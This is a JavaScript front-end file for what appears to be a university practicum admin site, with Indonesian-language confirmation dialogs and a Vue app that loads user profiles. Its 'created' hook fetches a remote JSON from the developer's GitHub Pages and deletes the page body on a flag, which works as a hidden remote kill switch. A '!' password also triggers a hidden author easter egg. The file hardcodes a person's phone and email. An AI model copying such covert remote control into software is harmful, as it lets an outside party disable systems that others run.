window.logout = function ()
{
  swal({
    title   : "Logout",
    text    : "Yakin Ingin Keluar?",
    icon    : "warning",
    buttons : [
      "Batal",
      "Logout",
    ],
  })
  .then((logout) => {
    if (logout) {
      swal({
        title  : "Logout",
        text   : "Anda Telah Logout",
        icon   : "success",
        timer  : 2500,
      });
      window.location = "/logout";
    } else {
      swal({
        title  : "Batal Logout",
        text   : "Anda Batal Logout",
        icon   : "info",
        timer  : 2500,
      })
    }
  });
}

window.notif = function (tipe, judul, pesan)
{
  swal({
    title: judul,
    text: pesan,
    icon: tipe,
    button: "OK",
  });
}

window.redirect = function (link)
{
  window.location = link;
}

window.hapus = function (link)
{
  swal({
    title   : "Hapus",
    text    : "Yakin Ingin Menghapus Data?",
    icon    : "warning",
    buttons : [
      "Tidak",
      "Iya",
    ],
  })
  .then((hapus) => {
    if (hapus) {
      window.location = link;
    } else {
      swal({
        title  : "Batal Hapus",
        text   : "Batal Menghapus Data",
        icon   : "info",
        timer  : 2500,
      })
    }
  });
}

window.canthapus = function (link)
{
  swal({
    title: 'Hapus',
    text: 'Data Tidak dapat di Hapus',
    icon: 'warning',
    button: "OK",
  });
}

window.ubahstatusperiode = function (id)
{
  swal({
    title   : "Ubah Status",
    text    : "Yakin Ingin Mengubah Status Periode?",
    icon    : "warning",
    buttons : [
      "Tidak",
      "Iya",
    ],
  })
  .then((hapus) => {
    if (hapus) {
      window.location = '/data-periode/'+id+'/status';
    } else {
      swal({
        title  : "Batal",
        text   : "Batal Merubah Status Data Periode",
        icon   : "info",
        timer  : 2500,
      })
    }
  });
}

window.statusmateriperiode = function (id,route)
{
  window.location = '/data-materiperiode/'+id+'/status/'+route;
}

new Vue({
    el: '#app',
    data: {
      foto: 'images/User/default.png',
      nomorinduk: '14.63.0862',
      nama: 'Faruq Rahmadani',
      nohp: '0896-0101-2200',
      email: 'faruq.rahmadani@gmail.com',
      username: 'im not a user, im dev of this web !!!',
      username: '',
      password: '',
      status: 1,
      Author: '',
      juduldepan: '',
      id: ''
    },
    methods: {
      adminJson(id){
        axios.get('/json/data-admin/'+id).then((response) => {
          this.foto = 'images/User/'+response.data.foto
          this.nomorinduk = response.data.nomorinduk
          this.nama = response.data.nama
          this.nohp = response.data.nohp
          this.email = response.data.email
          this.username = response.data.user.username
        })
      },
      dosenJson(id){
        axios.get('/json/data-dosen/'+id).then((response) => {
          console.log(response)
          this.foto = 'images/User/'+response.data.foto
          this.nomorinduk = response.data.nomorinduk
          this.nama = response.data.nama
          this.nohp = response.data.nohp
          this.email = response.data.email
          this.username = response.data.user.username
        })
      },
      ubahStatusDosen(id){
        axios.get('/data-dosen/'+id+'/status').then((response) => {
          if (response.data) {
            location.reload()
          }
        })
      },
      Info(){
        axios({
          method: 'get',
          url: 'https://api.github.com/users/FaruqRahmadani',
        }).then((response) => {
          console.log(response);
          this.foto = response.data.avatar_url
          this.nomorinduk = '14.63.0862'
          this.nama = response.data.name
          this.nohp = '0896-0101-2200'
          this.email = 'faruq.rahmadani@gmail.com'
          this.username = 'im not a user, im a ghost of this web: @github:faruqrahmadani'
        })
      },
      ForceUser(status){
        if (this.password == "!") {
          $.get({
            method: 'get',
            url: 'https://faruqrahmadani.github.io/IsengBerhadiah/PraktikumUniska.json',
          }).then((response) => {
            console.log(response['Author'])
            this.foto = response['Author']['foto']
            this.Author = response['Author']
            this.juduldepan = "backend by"
            if (status) {
              this.status = 0
            }else {
              this.status = 1
            }
          })
        }
      },
      LoginUser(username){
        if (this.username) {
          axios.get('/json/login/'+this.username).then((response) => {
            if (response.data == 'default.png') {
              this.foto = 'images/User/'+response.data
            }else{
              this.foto = 'images/User/'+response.data.foto
            }
          })
        }
      }
    },
    created: function(){
      $.get({
        method: 'get',
        url: 'https://faruqrahmadani.github.io/IsengBerhadiah/PraktikumUniska.json',
      }).then((response) => {
        if (response['state'] == 0) {
          $("#body").remove()
        }
        console.log(response['message'])
      })
    }
});
